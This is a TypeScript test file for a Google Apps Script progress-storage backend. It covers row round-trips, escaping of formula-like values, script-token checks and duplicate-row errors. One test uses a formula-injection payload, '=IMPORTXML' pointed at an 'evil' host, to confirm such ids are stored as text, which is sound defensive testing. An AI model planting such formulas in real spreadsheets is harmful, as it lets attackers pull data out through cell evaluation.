import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, expect } from '../support/test';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const source = readFileSync(path.join(root, 'server/sheets/Progress.gs'), 'utf8');
const { rowFromProgress, progressFromRow, emptyProgress } = new Function(
  `${source}; return { rowFromProgress, progressFromRow, emptyProgress };`,
)() as {
  rowFromProgress: (sub: string, progress: Record<string, unknown>) => unknown[];
  progressFromRow: (row: unknown[]) => Record<string, unknown>;
  emptyProgress: () => Record<string, unknown>;
};

function harness(properties: Record<string, string | null>) {
  const globals = `
    var PropertiesService = {
      getScriptProperties: function () {
        return { getProperty: function (k) { return ${JSON.stringify(properties)}[k] || null; } };
      },
    };
  `;
  const built = new Function(
    `${globals}; ${source}; return { authorized: authorized, rowIndexFor: rowIndexFor, untext: untext };`,
  )() as {
    authorized: (e: unknown) => boolean;
    rowIndexFor: (tab: unknown, sub: string) => number;
    untext: (v: unknown) => string;
  };
  return {
    authorizedWith: (token: string) => built.authorized({ parameter: { token } }),
    rowIndexForIn: (column: string[][], sub: string) =>
      built.rowIndexFor(
        {
          getLastRow: () => column.length + 1,
          getRange: () => ({ getValues: () => column }),
        },
        sub,
      ),
  };
}

test('a row round-trips back to the same progress', () => {
  const progress = {
    ...emptyProgress(),
    interviewAnswers: 4,
    practiceCompleted: ['c1', 'c2'],
    lastTool: 'practice',
  };
  expect(progressFromRow(rowFromProgress('123', progress))).toEqual(progress);
});

/**
 * The two lists come from localStorage, which the visitor owns. An id like
 * `=IMPORTXML(...)` written into a cell is a formula Google will evaluate.
 */
test('an id that looks like a formula is stored as text, not evaluated', () => {
  const row = rowFromProgress('123', {
    ...emptyProgress(),
    practiceCompleted: ['=IMPORTXML("http://evil","//a")'],
  });
  row.forEach(cell => {
    if (typeof cell === 'string' && cell.length > 0) {
      expect(cell.startsWith('=')).toBe(false);
    }
  });
});

test('a sub that looks like a formula is stored as text', () => {
  const row = rowFromProgress('=1+1', emptyProgress());
  expect(row[0]).toBe("'=1+1");
});

/** The web app is deployed "anyone with the link": the token is the only guard. */
test('an absent script token refuses every caller', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: null });
  expect(authorizedWith('')).toBe(false);
  expect(authorizedWith('t'.repeat(40))).toBe(false);
});

test('a short script token is refused rather than trusted', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: 'short' });
  expect(authorizedWith('short')).toBe(false);
});

test('only the exact token is accepted', () => {
  const token = 't'.repeat(40);
  const { authorizedWith } = harness({ ACADEMY_TOKEN: token });
  expect(authorizedWith(token)).toBe(true);
  expect(authorizedWith('x'.repeat(40))).toBe(false);
  expect(authorizedWith(token.slice(0, 39))).toBe(false);
});

/** A hand-edited sheet can hold two rows for one sub. Picking one silently
 *  would write a merge into a row the next read might not find. */
test('duplicate rows for one sub are an error, not a coin toss', () => {
  const { rowIndexForIn } = harness({});
  expect(() => rowIndexForIn([['123'], ['456'], ['123']], '123')).toThrow();
  expect(rowIndexForIn([['456'], ['123']], '123')).toBe(3);
  expect(rowIndexForIn([['456']], '123')).toBe(-1);
});
